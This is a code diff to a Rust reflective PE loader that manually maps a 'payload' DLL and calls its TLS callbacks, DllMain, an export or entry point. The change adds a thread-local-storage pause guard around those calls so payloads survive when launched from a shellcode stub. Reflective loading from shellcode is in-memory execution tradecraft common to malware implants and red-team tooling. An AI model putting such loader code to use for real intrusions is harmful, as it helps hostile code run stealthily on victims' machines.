@@ -121,10 +121,24 @@ pub unsafe fn run_reflective(
     crate::tech_dbg!("reflective_loading", "relocations applied");
     fix_memory_protections(image_base, nt)?;
     crate::tech_dbg!("reflective_loading", "section protections applied");
-    // The payload's `DLL_PROCESS_ATTACH` callbacks initialize its global state,
-    // which is all this mapper can offer: it does not provision the per-thread
-    // TLS a manually mapped image has no index for (see `run_tls_callbacks`).
-    run_tls_callbacks(image_base, nt);
+
+    // From here on the payload's own code runs (TLS callbacks, `DllMain`, the
+    // export or the entry point). Each payload call runs paused: payload code
+    // must run on the array its own threads will see, and a payload that loads
+    // a module with static TLS makes the loader grow the per-thread array (a
+    // shellcode stub's private array would crash it). The guards never span a
+    // `tech_dbg!` print — a debug stub prints on its own TLS, never paused —
+    // and a payload that blocks in its export keeps the paused state for its
+    // whole lifetime.
+
+    {
+        let _handoff = crate::tls_handoff::PauseGuard::enter();
+        // The payload's `DLL_PROCESS_ATTACH` callbacks initialize its global
+        // state, which is all this mapper can offer: it does not provision the
+        // per-thread TLS a manually mapped image has no index for (see
+        // `run_tls_callbacks`).
+        run_tls_callbacks(image_base, nt);
+    }
     crate::tech_dbg!("reflective_loading", "TLS callbacks executed");
 
     // Opt-in and last among the loader's own steps: zero the mapped image's PE
@@ -144,14 +158,17 @@ pub unsafe fn run_reflective(
         // running against uninitialized state.
         if is_dll {
             crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
+            let _handoff = crate::tls_handoff::PauseGuard::enter();
             call_dll_main(image_base, nt);
         }
         let address = resolve_export(image_base, nt, name)?;
         crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
+        let _handoff = crate::tls_handoff::PauseGuard::enter();
         call_export(address);
         return Ok(0);
     }
 
+    let _handoff = crate::tls_handoff::PauseGuard::enter();
     execute_entrypoint(image_base, nt, is_dll)
 }
 
